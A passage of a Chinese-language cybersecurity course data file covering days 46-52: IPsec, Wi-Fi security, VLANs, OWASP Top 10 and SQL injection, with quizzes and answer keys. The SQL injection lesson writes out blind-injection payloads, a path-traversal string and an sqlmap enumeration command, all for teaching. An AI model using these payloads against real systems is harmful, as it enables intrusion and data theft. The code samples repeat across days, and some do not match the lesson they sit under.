    │  ESP (50)   │ ← 加密+认证（主要使用）
    │  AH  (51)   │ ← 仅认证（几乎不用）
    ├─────────────┤
    │  IP          │
    └─────────────┘
IKEv2流程（4条消息）：
  IKE_SA_INIT    (2条) → DH密钥交换 + 协商算法
  IKE_AUTH       (2条) → 证书认证 + 建立子SA
\`\`\`
### 2.2 传输模式 vs 隧道模式
\`\`\`
传输模式 (Transport Mode)：
  原IP头 │ TCP/UDP │ 数据
        ↓
  原IP头 │ ESP头 │ TCP/UDP │ 数据 │ ESP尾 │ ESP认证
  ←──── 加密范围 ────→
  ←────────── 认证范围 ──────────→
  适用：主机到主机的端到端通信
隧道模式 (Tunnel Mode)：
  原IP头 │ TCP/UDP │ 数据
        ↓
  新IP头 │ ESP头 │ 原IP头 │ TCP/UDP │ 数据 │ ESP尾 │ ESP认证
  ←───────────── 加密范围 ─────────────→
  ←──────────────── 认证范围 ────────────────→
  适用：Site-to-Site VPN，整个原始包被封装保护
\`\`\`
### 2.3 IPsec安全关联(SA)
\`\`\`
SA (Security Association) — IPsec核心概念：
SA是一个单向安全连接定义，包含：
  · SPI (Security Parameter Index) — 32位标识符
  · 加密算法和密钥
  · 认证算法和密钥
  · SA生存期（时间/字节数）
每个IPsec连接需要2个SA（入方向+出方向）
IKE SA (ISAKMP SA)：
  · 保护IKE通信本身
  · 双向，控制通道`,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q46-1","question":"IPsec中AH提供什么？","options":["机密性", "完整性和数据源认证(无加密)", "压缩", "QoS"],"correctIndex":1,"explanation":"AH=完整性+认证，不加密载荷。"},{"id":"q46-2","question":"IPsec ESP的隧道模式加密范围？","options":["仅数据", "整个原始IP包", "仅头部", "仅尾部"],"correctIndex":1,"explanation":"隧道模式=整个原始IP包加密+新IP头。"},{"id":"q46-3","question":"WireGuard相比IPsec的优势？","options":["更安全", "实现简洁(约4000行代码)+性能好", "标准更老", "仅支持Linux"],"correctIndex":1,"explanation":"WireGuard代码精简、配置简单。"},{"id":"q46-4","question":"SSL VPN比IPsec的优势？","options":["更高的安全性", "无需客户端,浏览器即可访问", "更快", "更便宜"],"correctIndex":1,"explanation":"SSL VPN用浏览器HTTPS即可连接。"},{"id":"q46-5","question":"零信任架构对VPN的影响？","options":["替代所有VPN", "从\"先连网络再访问\"变为\"按应用级别验证\"", "VPN更必要", "无影响"],"correctIndex":1,"explanation":"零信任=永不信任始终验证,超越传统VPN模式。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[46]||[],
});
allDays.push({
  id:'day-47',day:47,week:7,title:'无线网络安全（网络安全）',
  objectives:['Wi-Fi安全协议演进','WPA3深度解析','802.1X企业认证'],
  content:`# Day 47：无线网络安全
## 一、Wi-Fi安全协议演进
### 1.1 安全协议时间线
\`\`\`
┌─────────┬──────────┬──────────────┬──────────────────────┐
│  协议    │   年份    │   加密/认证   │       安全性          │
├─────────┼──────────┼──────────────┼──────────────────────┤
│ WEP     │   1999   │ RC4 + CRC-32 │ ☠ 分钟级破解          │
│ WPA     │   2003   │ TKIP (RC4)   │ ⚠️ 已知弱点           │
│ WPA2    │   2004   │ CCMP (AES)   │ ⚠️ KRACK攻击(2017)   │
│ WPA3    │   2018   │ SAE + GCMP   │ ✅ 当前推荐           │
└─────────┴──────────┴──────────────┴──────────────────────┘
\`\`\`
### 1.2 WEP为何不安全
\`\`\`
WEP致命缺陷：
① 短IV（24位=1670万个值）
   → 流量大的AP数小时内IV循环重复
   → IV重复 → RC4密钥流复用 → 可恢复明文
② RC4弱点
   → FMS攻击(2001)：利用弱IV，100万包可破解
   → PTW攻击(2007)：仅需4万包
   → 当前：商用工具几秒到几分钟破解
③ CRC-32完整性检查
   → 线性的，可预测修改
   → 攻击者可以伪造数据包的CRC
④ 静态密钥
   → 所有客户端使用相同密钥
   → 无密钥管理机制
结论：WEP = 完全不安全，等同于开放网络！
\`\`\`
---
## 二、WPA3深度解析
### 2.1 WPA2 vs WPA3
\`\`\`
┌──────────────────┬─────────────────────┬─────────────────────┐
│      特性         │       WPA2          │       WPA3          │
├──────────────────┼─────────────────────┼─────────────────────┤
│ 个人模式认证      │ PSK (预共享密钥)     │ SAE (对等同步认证)   │
│ 握手             │ 4-Way Handshake     │ SAE + 4-Way HS     │
│ 前向保密          │ ❌ (PSK模式)         │ ✅ 内置              │
│ 离线字典攻击      │ ✅ 易受攻击           │ ❌ 抗离线字典        │
│ 加密             │ CCMP-128 (AES)      │ GCMP-256 (AES-256) │
│ 管理帧保护(PMF)   │ 可选                │ 强制                │
│ Wi-Fi Easy Connect│ ❌                  │ ✅ (DPP, QR扫码)    │
│ 公共网络保护      │ ❌ (明文)            │ ✅ (OWE加密)         │
│ 企业模式         │ 802.1X              │ 802.1X + 192位      │
└──────────────────┴─────────────────────┴─────────────────────┘
\`\`\`
### 2.2 SAE握手详解
\`\`\`
WPA3 SAE (Simultaneous Authentication of Equals)：
  核心：基于Dragonfly密钥交换（密码认证密钥交换PAKE）
  Client                          AP
    │                              │
    │── Commit (标量+元素) ──────→│  ← 双方生成临时密钥对
    │←── Commit (标量+元素) ────│
    │                              │
    │── Confirm (验证令牌) ──────→│  ← 双方验证对方知道密码
    │←── Confirm (验证令牌) ────│
    │                              │
    │  PMK 已安全建立              │
    │  ← 4-Way Handshake →        │
关键安全特性：
  ✅ 抗离线字典攻击：每次尝试需要与AP交互
  ✅ 前向保密：即使密码泄露，历史流量仍安全
  ✅ 完美隐匿：不发送密码或哈希
\`\`\`
### 2.3 WPA3新技术
\`\`\`
① OWE (Opportunistic Wireless Encryption)：
  开放网络自动加密（无密码Wi-Fi也加密！）
  使用DH密钥交换建立连接
② DPP (Device Provisioning Protocol)：
  通过QR码/NFC轻松连接（替代WPS）
  基于公钥的零触摸配置
③ 192位安全模式 (WPA3-Enterprise)：
  ECDH + ECDSA ≥ 384位曲线
  AES-256-GCMP
  SHA-384 HMAC`,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q47-1","question":"WPA3相比WPA2的主要改进？","options":["仅改名", "SAE握手(防离线字典攻击)+管理帧保护", "更慢", "不需要密码"],"correctIndex":1,"explanation":"SAE=Simultaneous Authentication of Equals。"},{"id":"q47-2","question":"802.1X在企业WiFi中用于？","options":["加速WiFi", "基于端口的网络访问控制/认证", "隐藏SSID", "降功耗"],"correctIndex":1,"explanation":"802.1X=EAP认证+动态密钥分发。"},{"id":"q47-3","question":"KRACK攻击针对什么？","options":["蓝牙", "WPA2四次握手重装密钥", "WEP", "有线网络"],"correctIndex":1,"explanation":"KRACK利用WPA2握手中的密钥重装漏洞。"},{"id":"q47-4","question":"WIPS的全称？","options":["Wireless Intrusion Prevention System", "Wired Internet Protocol", "Wireless IP System", "Web IP Security"],"correctIndex":0,"explanation":"无线入侵防御系统。"},{"id":"q47-5","question":"企业WiFi应该禁用？","options":["WPA3", "WEP/WPA(TKIP)", "802.1X", "AES加密"],"correctIndex":1,"explanation":"WEP/WPA已不安全，禁用。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[47]||[],
});
allDays.push({
  id:'day-48',day:48,week:7,title:'网络分段（网络安全）',
  objectives:['网络分段基础概念','VLAN深度解析','VLAN攻击与防御'],
  content:`# Day 48：网络分段
## 一、网络分段基础概念
### 1.1 为什么需要分段
\`\`\`
不合理的扁平网络：
  所有设备在同一广播域/子网
  ┌─────┬─────┬─────┬─────┬─────┬─────┐
  │  PC  │ 服务器│ 打印机│ 摄像头│  IoT  │  访客 │
  └──┬───┴──┬───┴──┬───┴──┬───┴──┬───┴──┬──┘
     └──────┴──────┴──────┴──────┴──────┘
问题：
  · 任何设备被攻破 → 可到达所有其他设备
  · 广播风暴影响全局
  · 无法差异化安全策略
  · 无法实现信任分区
分段后的网络：
  ┌────────┐  ┌────────┐  ┌──────────┐  ┌────────┐
  │ 办公网  │  │ 服务器网 │  │  访客网络  │  │ 管理网  │
  │ VLAN10 │  │ VLAN20 │  │  VLAN30  │  │ VLAN40 │
  └───┬────┘  └───┬────┘  └────┬─────┘  └───┬────┘
      └───────────┴────────────┴─────────────┘
                     │
               [防火墙/ACL]
              访问控制跨VLAN
\`\`\`
### 1.2 分段层次
\`\`\`
不同层次的分段技术：
  物理分段：
    不同交换机/路由器 → 完全物理隔离
    最高安全，最不灵活，最昂贵
  逻辑分段：
    VLAN → 二层逻辑隔离
    子网 → 三层逻辑隔离
  微分段：
    主机级策略 → 工作负载间控制
    SDP → 软件定义边界
    零信任 → 身份驱动的访问控制
\`\`\`
---
## 二、VLAN深度解析
### 2.1 VLAN基础知识
\`\`\`
VLAN = Virtual LAN → 将一个物理交换机逻辑上划分为多个广播域
┌─────────────────────────────────────────┐
│          VLAN编号范围                     │
├─────────┬───────────────────────────────┤
│ 0       │ 不使用（表示无VLAN）            │
│ 1       │ 默认VLAN（Cisco）              │
│ 2-1001  │ 标准VLAN                       │
│ 1002-1005│ Token Ring/FDDI保留           │
│ 1006-4094│ 扩展VLAN (需VTPv3)           │
│ 4095     │ 保留                           │
└─────────┴───────────────────────────────┘
VLAN标记协议：
  · ISL (Inter-Switch Link) — Cisco私有，已淘汰
  · IEEE 802.1Q — 业界标准，4字节Tag
802.1Q帧结构：
  ┌────────┬──────┬────────┬───────────┬──────┐
  │ DestMAC│ SrcMAC│ 802.1Q │ Type/Size │ Data │
  │ 6字节  │ 6字节│ 4字节  │ 2字节     │      │
  └────────┴──────┴──┬──┬──┴───────────┴──────┘
                     │  │
            TPID(0x8100) │ PCP(3位) DEI(1位) VID(12位)
\`\`\`
### 2.2 端口类型
\`\`\`
Access端口 (接入端口)：
  · 属于单个VLAN
  · 帧不带Tag进出
  · 用于连接终端设备（PC、打印机）
  · switchport mode access
  · switchport access vlan 10
Trunk端口 (中继端口)：
  · 承载多个VLAN的流量
  · 帧带802.1Q Tag
  · 用于交换机之间的连接
  · switchport mode trunk
  · switchport trunk allowed vlan 10,20,30
Native VLAN：`,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q48-1","question":"VLAN的主要安全优势？","options":["加速网络", "逻辑隔离广播域，限制攻击横向移动", "降低成本", "加密数据"],"correctIndex":1,"explanation":"VLAN逻辑分段=有限广播域=减少攻击面。"},{"id":"q48-2","question":"VLAN跳跃攻击(VLAN Hopping)利用？","options":["设备故障", "DTP协商+双标签", "密码破解", "DoS"],"correctIndex":1,"explanation":"VLAN Hopping=利用交换机Trunk+DTP。"},{"id":"q48-3","question":"微分段(Micro-segmentation)指？","options":["大网络划分", "工作负载级别的精细隔离", "物理分段", "WAN划分"],"correctIndex":1,"explanation":"微分段=每个工作负载独立策略。"},{"id":"q48-4","question":"SDN安全的核心理念？","options":["集中控制+可编程安全策略", "分布式管理", "纯硬件实现", "黑盒"],"correctIndex":0,"explanation":"SDN=集中控制器+灵活策略。"},{"id":"q48-5","question":"零信任三大核心原则？","options":["永不信任+始终验证+最小权限", "信任内网+最小权限", "信任外网+加密", "仅验证不加密"],"correctIndex":0,"explanation":"零信任三大支柱。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[48]||[],
});
allDays.push({
  id:'day-49',day:49,week:7,title:'七周总结与测验（网络安全）',
  objectives:['第七周知识地图','每日精华回顾','核心对比表汇总'],
  content:`# Day 49：第七周总结与测验
\`\`\`
                    ┌─────────────────────────┐
                    │     网络安全知识体系      │
                    └───────────┬─────────────┘
                                │
    ┌───────────┬───────────────┼───────────────┬───────────────┐
    │           │               │               │               │
┌───▼───┐  ┌───▼───┐     ┌────▼────┐     ┌───▼───┐     ┌────▼────┐
│协议安全│  │ 防火墙  │     │ IDS/IPS │     │  VPN   │     │ 无线安全 │
│(Day43) │  │(Day44) │     │(Day45)  │     │(Day46) │     │(Day47)  │
├───────┤  ├───────┤     ├────────┤     ├───────┤     ├────────┤
│·ARP欺骗│  │·包过滤  │     │·IDSvsIPS│    │·IPsec │     │·WPA3 SAE│
│·SYNFlood│ │·状态检测│     │·Snort规则│   │·SSL VPN│    │·802.1X  │
│·DNS劫持│  │·NGFW   │     │·HIDS    │    │·WireGuard│   │·EvilTwin│
│·IPsec  │  │·DMZ    │     │·SIEM协作│    │·对比表  │    │·WIPS    │
└───────┘  └───────┘     └────────┘     └───────┘     └────────┘
                                │
                    ┌───────────▼───────────┐
                    │    网络分段 (Day 48)    │
                    ├───────────────────────┤
                    │·VLAN/802.1Q安全       │
                    │·微分段(Micro-Seg)     │
                    │·SDN安全              │
                    │·零信任(NIST 800-207)  │
                    │·SDP(软件定义边界)      │
                    │·NAC(网络访问控制)      │
                    └───────────────────────┘
\`\`\`
---
### Day 43：网络协议安全
\`\`\`
核心掌握：
  · TCP/IP四层模型及每层安全威胁
  · ARP欺骗：无状态+无条件接受Reply → MITM
  · SYN Flood：填充半连接队列 → SYN Cookie防御（无状态握手）
  · DNS缓存投毒：16位TXID+固定端口可攻击 → DNSSEC
  · IP欺骗：源地址伪造 → 入向过滤(BCP 38)
\`\`\`
### Day 44：防火墙技术
\`\`\`
核心掌握：
  · 五代防火墙：包过滤→状态检测→应用代理→UTM→NGFW
  · 状态检测核心：状态表自动处理回程流量
  · NGFW标志：不论端口识别应用 + 用户感知
  · DMZ设计原则：对互联网有条件开放，对内网严格限制
  · 默认拒绝原则：最后规则deny+log
\`\`\`
### Day 45：入侵检测系统
\`\`\`
核心掌握：
  · IDS旁路只告警 vs IPS串联能阻断
  · 四种检测方法：签名+异常+协议+信誉
  · Snort规则结构：action proto src -> dst (options)
  · HIDS：文件完整性+日志分析+进程监控
  · 告警优先级矩阵：高影响+高准确=P0
\`\`\`
### Day 46：VPN技术
\`\`\`
核心掌握：
  · IPsec两协议：ESP(加密+认证) vs AH(仅认证)
  · 传输vs隧道：端到端 vs 网关到网关
  · SSL VPN优势：无客户端+细粒度+443端口友好
  · WireGuard理念：4000行代码 + 现代密码 + 内核态
  · PPTP：永远不要用（MS-CHAPv2可破解）
\`\`\`
### Day 47：无线网络安全
\`\`\`
核心掌握：
  · WEP不安全的三个原因：RC4+短IV(24位)+静态密钥
  · WPA3 SAE：抗离线暴力 + 前向保密 + PMF强制
  · 802.1X三件套：Supplicant + Authenticator + Auth Server
  · Evil Twin防御：WPA3 SAE双向认证
  · WIPS：检测Rogue AP + Deauth攻击 + 自动防御
\`\`\`
### Day 48：网络分段
\`\`\`
核心掌握：
  · VLAN跳跃：Switch Spoofing + Double Tagging
  · 防御：关闭DTP + 改Native VLAN + Trunk全打Tag`,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q49-1","question":"TCP三次握手SYN→__→ACK中缺什么？","options":["RST", "SYN-ACK", "FIN", "PSH"],"correctIndex":1,"explanation":"三次握手=SYN→SYN-ACK→ACK。"},{"id":"q49-2","question":"包过滤防火墙工作在哪层？","options":["应用层", "传输层/网络层(第3-4层)", "数据链路层", "物理层"],"correctIndex":1,"explanation":"包过滤检查IP头和TCP/UDP头。"},{"id":"q49-3","question":"IPsec隧道模式与传输模式区别？","options":["无区别", "隧道模式加密整个IP包,传输模式仅加密载荷", "传输模式更安全", "隧道仅用于IPv6"],"correctIndex":1,"explanation":"隧道=新IP头+全加密；传输=原IP头+加密载荷。"},{"id":"q49-4","question":"WiFi WPA3-SAE主要防御？","options":["信号干扰", "离线字典攻击(brute-force)", "物理破坏", "电磁泄露"],"correctIndex":1,"explanation":"SAE=PWE(Password Element)防暴力破解。"},{"id":"q49-5","question":"网络DDoS防御不包括？","options":["流量清洗", "CDN", "漏洞扫描", "黑洞路由"],"correctIndex":2,"explanation":"漏洞扫描属于漏洞管理范畴。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[49]||[],
});
allDays.push({
  id:'day-50',day:50,week:8,title:'Web安全基础（应用安全）',
  objectives:['OWASP Top 10 (2021) 深度解析','HTTP安全头详解','同源策略与CORS'],
  content:`# Day 50：Web安全基础
## 一、OWASP Top 10 (2021) 深度解析
### 1.1 2021版全览
\`\`\`
┌────────┬────────────────────────────┬──────────────────────────────┐
│  排名   │         风险类别            │          核心问题             │
├────────┼────────────────────────────┼──────────────────────────────┤
│ A01    │ 失效的访问控制 (Broken AC)   │ 权限校验不严格，越权访问        │
│ A02    │ 加密失效 (Crypto Failures)  │ 弱加密、敏感数据泄露            │
│ A03    │ 注入 (Injection)            │ 用户输入拼接到解释器命令         │
│ A04    │ 不安全设计 (Insecure Design) │ 缺乏安全需求分析               │
│ A05    │ 安全配置错误 (Security Misconfig)│ 默认配置、错误配置          │
│ A06    │ 易受攻击和过时组件            │ 未更新的第三方库和组件          │
│ A07    │ 识别和认证失败                │ 弱认证、会话管理缺陷           │
│ A08    │ 软件和数据完整性失败          │ 未验证的更新、CI/CD篡改         │
│ A09    │ 安全日志和监控不足            │ 日志缺失、告警不及时            │
│ A10    │ SSRF (服务端请求伪造)         │ 服务器端请求未经验证            │
└────────┴────────────────────────────┴──────────────────────────────┘
A01取代A03登顶：失效的访问控制成为最常见的严重漏洞
新增：A04不安全设计、A08软件数据完整性失败、A10 SSRF
退出Top 10：XML外部实体(XXE)、跨站脚本(XSS深入A03注入)
\`\`\`
### 1.2 A01：失效的访问控制
\`\`\`
失效的访问控制示例：
① URL参数修改：
   /user/profile?id=123 → 改为?id=456 → 查看他人资料
② 路径遍历：
   /download?file=report.pdf → ?file=../../../etc/passwd
③ 缺少功能级访问控制：
   普通用户直接访问 /admin/deleteUser 未检查权限
④ CORS配置错误：
   Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true
防御：
  ✅ 默认拒绝，明确授权
  ✅ 服务端强制检查权限（不信任客户端）
  ✅ 使用成熟的访问控制框架
  ✅ JWT令牌验证每次请求
\`\`\`
### 1.3 A08：软件和数据完整性失败
\`\`\`
新的独立风险分类：
① 不安全的CI/CD管道：
   未签名的构建产物 → 依赖可能被投毒
   未经验证的第三方组件
② 不安全的反序列化：
   Java/PHP/.NET反序列化远程代码执行
   Jackson、Fastjson已知漏洞
③ 自动更新机制缺陷：
   更新包未签名 → 可以分发恶意更新
   SolarWinds (2020) 供应链攻击典型
防御：
  ✅ 使用依赖扫描工具(OWASP Dependency-Check)
  ✅ 数字签名验证所有更新包
  ✅ SLSA框架(Security Levels for Software Artifacts)
\`\`\`
---
## 二、HTTP安全头详解
### 2.1 安全响应头一览
\`\`\`
┌──────────────────────────┬──────────────────────────────────┐
│        安全头             │              作用                │
├──────────────────────────┼──────────────────────────────────┤
│ Content-Security-Policy  │ 限制资源加载来源，防XSS          │
│ Strict-Transport-Security│ 强制HTTPS，防降级攻击            │
│ X-Frame-Options          │ 防点击劫持                       │
│ X-Content-Type-Options   │ 防MIME类型嗅探                   │
│ Referrer-Policy          │ 控制Referrer信息泄露              │
│ Permissions-Policy       │ 限制浏览器API使用                 │
│ Cross-Origin-*-Policy    │ 跨域资源隔离(COOP/COEP/CORP)     │
│ Cache-Control            │ 控制缓存(敏感数据不缓存)          │
└──────────────────────────┴──────────────────────────────────┘
\`\`\`
### 2.2 CSP详解
\`\`\`
Content-Security-Policy 指令系统：
default-src 'self'                     ← 默认只允许同源
script-src 'self' 'nonce-{random}'     ← 脚本来源控制
style-src 'self' 'unsafe-inline'       ← 样式来源
img-src 'self' data: https:            ← 图片来源`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q50-1","question":"OWASP Top 10 2021排名第一？","options":["XSS", "失效的访问控制", "SQL注入", "SSRF"],"correctIndex":1,"explanation":"Broken Access Control排名第一。"},{"id":"q50-2","question":"同源策略(SOP)限制什么？","options":["仅CSS", "不同源的脚本访问对方DOM/Cookie等", "仅图片", "仅字体"],"correctIndex":1,"explanation":"SOP=协议+域名+端口完全相同。"},{"id":"q50-3","question":"CSP头的default-src \'self\'表示？","options":["允许所有来源", "仅允许同源加载资源", "禁止所有资源", "仅允许图片"],"correctIndex":1,"explanation":"default-src \'self\'=仅同源。"},{"id":"q50-4","question":"HSTS的作用？","options":["加速", "强制浏览器HTTPS访问(不可降级)", "隐藏IP", "压缩"],"correctIndex":1,"explanation":"HTTP Strict Transport Security。"},{"id":"q50-5","question":"CORS预检请求使用什么方法？","options":["GET", "OPTIONS", "POST", "HEAD"],"correctIndex":1,"explanation":"OPTIONS用于CORS预检。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[50]||[],
});
allDays.push({
  id:'day-51',day:51,week:8,title:'SQL注入深入（应用安全）',
  objectives:['SQL注入分类全景','盲注技术深度解析','二次注入'],
  content:`# Day 51：SQL注入深入
## 一、SQL注入分类全景
\`\`\`
SQL注入攻击分类：
                    ┌─────────────┐
                    │  SQL注入     │
                    └──────┬──────┘
           ┌───────────────┼───────────────┐
           │               │               │
    ┌──────▼──────┐ ┌─────▼─────┐ ┌───────▼───────┐
    │  带内注入    │ │  盲注      │ │   带外注入    │
    │ (In-Band)   │ │ (Blind)   │ │ (Out-of-Band) │
    ├─────────────┤ ├───────────┤ ├───────────────┤
    │· Union注入  │ │· Boolean  │ │· DNS外带      │
    │· 错误注入   │ │· Time-based│ │· HTTP外带     │
    └─────────────┘ └───────────┘ └───────────────┘
Union注入：结果回显在页面 → 最直观
错误注入：错误信息回显 → 最方便
Boolean盲注：页面行为差异(真/假) → 需要推断
Time盲注：响应时间差异 → 最慢但最隐蔽
\`\`\`
---
## 二、盲注技术深度解析
### 2.1 Boolean盲注
\`\`\`
Boolean盲注原理：通过页面返回的差异逐位猜测数据
示例：判断用户名
  admin' AND 1=1 --  → 页面正常显示
  admin' AND 1=2 --  → 页面异常显示（无数据）
确认存在注入后，逐字符猜解：
  # 猜数据库名第一个字符
  admin' AND SUBSTRING((SELECT database()),1,1)='a' --
  admin' AND SUBSTRING((SELECT database()),1,1)='b' --
  ...遍历到 'm' → 页面正常！第一个字符是'm'
  # 猜表名
  admin' AND SUBSTRING((SELECT table_name FROM 
  information_schema.tables WHERE table_schema=database() 
  LIMIT 0,1),1,1)>'m' --
效率提升：二分查找
  ASCII(SUBSTRING((...),1,1)) > 77 → 缩小范围
  → 每个字符从256次降为log₂(256) = 8次
\`\`\`
### 2.2 Time-based盲注
\`\`\`
基于时间的盲注：利用数据库延迟函数判断条件
  MySQL: SLEEP(5), BENCHMARK(5000000,MD5('test'))
  PostgreSQL: pg_sleep(5)
  SQL Server: WAITFOR DELAY '0:0:5'
  Oracle: DBMS_LOCK.SLEEP(5)
攻击示例：
  admin' AND IF(SUBSTRING((SELECT database()),1,1)='m',
              SLEEP(5), 0) --
  如果数据库名首字符是'm' → 页面延迟5秒返回
  如果数据库名首字符不是'm' → 页面立即返回
逐字符猜解完整数据库名 → 表名 → 列名 → 数据
\`\`\`
### 2.3 盲注自动化
\`\`\`
手工盲注效率太低，使用工具：
SQLMap盲注模式：
  --technique=B  (Boolean盲注)
  --technique=T  (Time-based盲注)
  自动枚举：
  sqlmap -u "http://target/login.php" --data="user=admin&pass=123" 
         -p user --technique=BT --dbs
手工辅助技巧：
  · 使用if-then条件
  · 字符范围二分法
  · 批量读取长度优化
\`\`\`
---
## 三、二次注入
### 3.1 攻击原理
\`\`\`
二次注入 (Second-Order SQL Injection)：
第一次请求(注册/存储)：
  用户注册用户名: admin' -- 
  INSERT INTO users (username) VALUES ('admin'' -- ')
  → 经过转义，安全存储：admin' -- 
第二次请求(查询/使用)：`,
  codeExample:{language:'python',code:'from flask import Flask, request, escape, make_response\n\napp = Flask(__name__)\n\n# 安全HTTP头配置\n@app.after_request\ndef add_security_headers(resp):\n    resp.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    resp.headers[\"X-Frame-Options\"] = \"DENY\"\n    resp.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    resp.headers[\"Content-Security-Policy\"] = \"default-src \'self\'\"\n    resp.headers[\"Strict-Transport-Security\"] = \"max-age=31536000\"\n    return resp\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # 安全: 输出编码防止XSS\n    return f\"<h1>搜索: {escape(q)}</h1>\"\n\nprint(\"安全HTTP头已部署: CSP/HSTS/X-Frame-Options/X-XSS-Protection\")\nprint(\"用户输入已通过escape()编码, 防御XSS攻击\")',description:'Web安全防护实践'},
  quiz:[{"id":"q51-1","question":"参数化查询防御什么？","options":["XSS", "SQL注入", "CSRF", "DDoS"],"correctIndex":1,"explanation":"参数化=预编译，SQL结构和数据分离。"},{"id":"q51-2","question":"二次注入(Second-Order)特点？","options":["直接回显", "恶意数据先存储，后续查询时触发", "需要SLEEP", "仅影响MySQL"],"correctIndex":1,"explanation":"二次注入=存储→取出→拼接执行。"},{"id":"q51-3","question":"NoSQL注入常见于？","options":["MySQL", "MongoDB($ne/$gt等操作符)", "Oracle", "SQLite"],"correctIndex":1,"explanation":"NoSQL注入利用查询操作符。"},{"id":"q51-4","question":"ORM能100%防注入吗？","options":["能", "不能(原生SQL仍可能注入)", "大多数情况能", "看语言"],"correctIndex":1,"explanation":"ORM原生SQL查询仍有注入风险。"},{"id":"q51-5","question":"时间盲注MySQL用什么函数？","options":["sleep()", "getdate()", "now()", "time()"],"correctIndex":0,"explanation":"sleep(5)制造5秒延迟判断。"}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[51]||[],
});
allDays.push({
  id:'day-52',day:52,week:8,title:'XSS深入（应用安全）',
  objectives:['XSS分类再梳理','DOM XSS深度分析','mXSS（突变XSS）'],
  content:`# Day 52：XSS深入
